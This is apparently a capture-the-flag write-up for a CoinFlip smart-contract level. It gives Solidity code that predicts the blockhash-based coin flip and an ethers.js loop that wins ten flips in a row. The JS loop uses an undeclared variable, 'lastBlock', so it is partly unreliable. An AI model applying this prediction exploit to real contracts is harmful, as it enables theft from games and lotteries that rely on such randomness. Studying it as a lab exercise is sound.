### Goals

We need to guess correctly the outcome 10 times in the row.

### Exploit

This contract usues psuedo random entropy to determine the flip outcome. We could use it to our advantage. We can copy the logic related to determining the side and use it in our contract that will help us crack this level.

We will need to this over time since the CoinFlip contract only allows flipping coin once in a block.

### Code

Head on to Remix IDE and create contract, dont forget to choose provider as Injected from Metamask.

```code
interface ICoinFlip {
    function flip(bool) external;
    function consecutiveWins() external view returns(uint256);
}

contract HelperFlip {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip flip;

    constructor(address _flip) {
        flip = ICoinFlip(_flip);
    }

    function getWins() external view returns(uint256) {
        return flip.consecutiveWins();
    }

    function guessForMe() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;
        flip.flip(side);
    }
}
```

Now deploy the Helper with address of CoinFlip contract, if everything goes right you should see instance of newly deployed contract.

It would be good now to use some JS snippet:

```code
import { ethers } from "ethers";

let tx;
let provider = new ethers.JsonRpcProvider(
  "https://ethereum-sepolia.publicnode.com"
);

const signer = new ethers.Wallet(
  "YOUR_PRV_KET",
  provider
);

let helper = new ethers.Contract(
  "HELPER_ADDRESS",
  [
    "function guessForMe() external",
    "function getWins() external view returns (uint256)",
  ],
  signer
);

let wins = await helper.getWins();
while (wins <= 10) {
  console.log(`wins: ${wins}`);
  let newBlock = await provider.getBlock("latest");
  if (lastBlock != newBlock) {
    lastBlock = newBlock;
    tx = await helper.guessForMe({ gasLimit: 100_000 });
    await tx.wait();
    console.log(`tx: ${tx.hash}`);
    wins = await helper.getWins();
  }
}
```

It will guess the correct side for you and call FlipCoin contract.

Done!
